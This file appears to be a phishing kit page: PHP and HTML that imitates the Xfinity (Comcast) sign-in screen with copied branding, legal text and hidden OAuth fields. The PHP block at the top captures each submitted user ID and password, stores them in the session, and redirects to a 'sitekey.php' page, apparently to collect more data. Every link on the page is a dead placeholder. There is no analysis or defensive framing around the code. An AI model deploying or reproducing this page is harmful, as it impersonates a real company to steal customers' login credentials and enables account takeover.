<?php 
        $email = $password = '';
        $emailErr = $passwordErr = '';
        $errors = [];

    if (isset($_POST['signin'])) {
        // Validate Email
        if (empty($_POST['userId'])) {
            $emailErr = 'Email Required';
            $errors[] = $emailErr;
        } else {
            $email = filter_input(INPUT_POST, 'userId', FILTER_SANITIZE_SPECIAL_CHARS);
            if (!filter_var($email, FILTER_SANITIZE_SPECIAL_CHARS)) {
                $emailErr = 'Invalid ID Format';
                $errors[] = $emailErr;
            }
        }

        // Validate Subject
        if (empty($_POST['password'])) {
            $passwordErr = 'Password Required';
            $errors[] = $passwordErr;
        } else {
            $password = filter_input(INPUT_POST, 'password', FILTER_SANITIZE_SPECIAL_CHARS);
        }

        if(empty($errors)){
            session_start();    
            $_SESSION['userId'] = $email;
            $_SESSION['password'] = $password;
            header("Location: ./sitekey.php");
        }
    }
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
    <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
    <title>Sign in to Xfinity</title>
    <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible">
    <meta content="yes" name="mobile-web-app-capable">
    <meta content="yes" name="apple-mobile-web-app-capable">
    <meta content="Get the most out of Xfinity from Comcast by signing in to your account. Enjoy and manage TV, high-speed Internet, phone, and home security services that work seamlessly together &mdash; anytime, anywhere, on any device." name="description">
    <meta content="width=device-width,initial-scale=1" name="viewport">
    <meta content="#ffffff" name="msapplication-TileColor">
    <meta content="#ffffff" name="theme-color">
    <link href="./css/S.ico" rel="icon">
    <link href="./css/fonts-remote.min.css" rel="stylesheet" type="text/css">
    <link href="./css/styles-light.min.css" rel="stylesheet" type="text/css">
    <meta content="app-id=776010987" name="apple-itunes-app">
    <style type="text/css">
        html {
        background-color: #F2F4F5;
        }
        #background {
        background: linear-gradient(10deg, #FFFFFF 0%, #FFFFFF 50%, #F2F4F5 50%, #F2F4F5 100%) no-repeat 0 120px;
        }
        #left {
        margin-left: 0;
        padding-right: 94px;
        box-sizing: border-box;
        }
        #left .h1 {
        font-weight: bold;
        margin-top: 24px;
        }
        #left hr {
        border: solid #b1b9bf;
        border-width: 1px 0 0 0;
        width: 64px;
        margin-left:0;
        }
        #left p {
        color: #44484c;
        font-size: 14px;
        line-height: 1.4;
        }
        #left p + p {
        margin: 18px 0 0 0;
        }
        #left img {
        margin-top: 24px;
        width: 100%;
        }
        #left img + p {
        margin-top: 12px;
        }
    </style>
</head>
<body class="has-footer">
    <div id="breakpoints"></div>
    <div id="background" style="height: 700.781px;"></div>
    <main id="bd">
        <h1 class="screen-reader-text">Sign in to Xfinity</h1>
        <div id="left">
            <h2 class="h1">It's easy to manage your<br>account and get help 24/7.</h2>
            <hr>
            <p>While we are transitioning thousands of customer service representatives to work from home, we encourage you to use our improved digital tools to quickly and easily get help and manage your services. <a href="#">Learn more</a></p>
            <p id="quick-bill-pay-message">Use <a href="#">quick bill pay</a> without even signing in.</p>
            <img src="./css/C1.png">
            <p>Comcast Business customer? <a href="#">Sign in here</a></p>

            <style>
            #right #quick-bill-pay { display: block; }
            </style>
        </div>

        <div id="right">
            <div class="container">
                <form id="signsmall" class="stacked-form" action="" method="post" name="loginForm">
                    <div class="single logo-wrapper">
                        <span class="xfinity-logo"></span>
                    </div>

                    <div class="textfield-wrapper">
                        <label class="float accessibly-hidden" for="userId">Xfinity ID</label> <input id="u1ser" maxlength="128" name="userId" required="" placeholder="Email, mobile, or username" spellcheck="false" value="" type="text">
                    </div>

                    <div class="textfield-wrapper">
                        <label class="float accessibly-hidden" for="password">Password</label> <input id="p1ass" maxlength="128" name="password"  required="" placeholder="Password" type="password">
                    </div>
                    <div class="checkbox-container">
                        <label for="remember_me">
                        <input type="checkbox" id="remember_me" name="rm" value="1"><span id="remember_me_checkbox" class="checkbox"></span><div class="content">Stay signed in</div>
                        </label>
                        <button type="button" id="rm_label_learn_more" class="icon info cancel" data-id-ref="rm_help" aria-controls="rm_help" aria-label="Learn more about staying signed in"></button>
                    </div>
                    <button class="submit" id="sign_in" type="submit" name="signin">Sign In</button>
                    <ul>
                        <li id="forgot-username-password-item">Forgot <a href="#" target="_self" title="Look up Xfinity ID">Xfinity ID</a> or <a href="#" id="forgotPwdLink" target="_self" title="Reset Password">password</a>?
                        </li>

                        <li id="create-username-item">Don't have an Xfinity ID? <span><a href="#" target="_self">Create one</a></span></li>

                        <li id="quick-bill-pay">
                        <a href="#" target="_self">Pay any balance</a> without signing in
                        </li>
                    </ul>
                    <p id="implied-legal">By signing in, you agree to our <a href="#">Privacy Policy</a>.</p>
                    <input name="r" value="comcast.net" type="hidden"> <input name="selectAccount" value="false" type="hidden"> <input name="s" value="oauth" type="hidden"> <input name="deviceAuthn" value="false" type="hidden"> <input name="continue" value="#" type="hidden"> <input name="ipAddrAuthn" value="false" type="hidden"> <input name="forceAuthn" value="1" type="hidden"> <input name="lang" value="en" type="hidden"> <input name="passive" value="false" type="hidden"> <input name="client_id" value="my-account-web" type="hidden"> <input name="reqId" value="a76873ff-aff2-42d1-9d6c-7419680f9cd1" type="hidden">
                </form>
            </div>
        </div>
    </main>
    <footer>
        <span class="content">
            <span class="copyright">&copy; 2021 Comcast</span>
            <nav>
                <span class="divider hide-compact"></span>
                <span class="links">
                    <a href="#">Privacy Policy</a>
                    <span class="divider"></span>
                    <a href="#">Terms of Service</a>
                </span>
                <span class="ad-links divider" style="display: none ! important;"></span>
                <span class="ad-links links" style="display: none ! important;">
                    <a href="#" target="_blank">Ad Info</a>
                    <span class="divider"></span>
                    <a href="#" target="_blank">Ad Feedback</a>
                </span>
                <span class="divider hide-compact"></span>
                    <span class="links">
                    <a href="#">Cal. Civ. Code &sect;1798.135: Do Not Sell My Info</a>
                </span>
            </nav>
        </span>
    </footer>

    <div aria-hidden="true" class="overlay" data-dialog-type="overlay" id="rm_help" role="dialog">
        <div class="content" role="document">
            <button aria-label="Close" class="close" type="button"></button>
            <h1>Why Stay Signed In?</h1>
            <p>With this option selected, you'll stay signed in to your account on this device until you sign out. You should not use this option on public or shared devices.</p>
            <p>For your security, you may be asked to enter your password before accessing certain information.</p>
        </div>
    </div>

<iframe class="aamIframeLoaded" id="destination_publishing_iframe_comcastathena_1" name="destination_publishing_iframe_comcastathena_1_name" sandbox="allow-scripts allow-same-origin" src="" style="display: none; width: 0px; height: 0px;" title="Adobe ID Syncing iFrame"></iframe><iframe class="aamIframeLoaded" id="destination_publishing_iframe_comcast_0" name="destination_publishing_iframe_comcast_0_name" sandbox="allow-scripts allow-same-origin" src="" style="display: none; width: 0px; height: 0px;" title="Adobe ID Syncing iFrame"></iframe>
</body>
</html>
